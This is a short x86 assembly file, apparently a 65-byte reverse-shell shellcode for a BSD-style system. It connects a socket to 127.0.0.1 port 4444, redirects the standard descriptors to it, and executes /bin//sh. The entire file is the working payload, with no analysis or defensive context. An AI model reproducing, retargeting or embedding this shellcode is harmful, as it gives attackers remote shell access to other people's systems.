.globl start

start:

# 65 bytes

cntsockcode:
    pushl   $0x0100007f
    pushl   $0x5c1102ff
    movl    %esp,%edi

    xorl    %eax,%eax
    pushl   %eax
    pushl   $0x01
    pushl   $0x02
    pushl   $0x10
    movb    $0x61,%al
    int     $0x80

    pushl   %edi
    pushl   %eax
    pushl   %eax
    pushl   $0x62
    popl    %eax
    int     $0x80

    pushl   %eax

0:
    pushl   $0x5a
    popl    %eax
    int     $0x80

    decl    -0x18(%edi)
    jns     0b

shellcode:
#    xorl    %eax,%eax
#    pushl   %eax
    pushl   $0x68732f2f
    pushl   $0x6e69622f
    movl    %esp,%ebx
    pushl   %eax
    pushl   %esp
    pushl   %esp
    pushl   %ebx
    pushl   %eax
    movb    $0x3b,%al
    int     $0x80
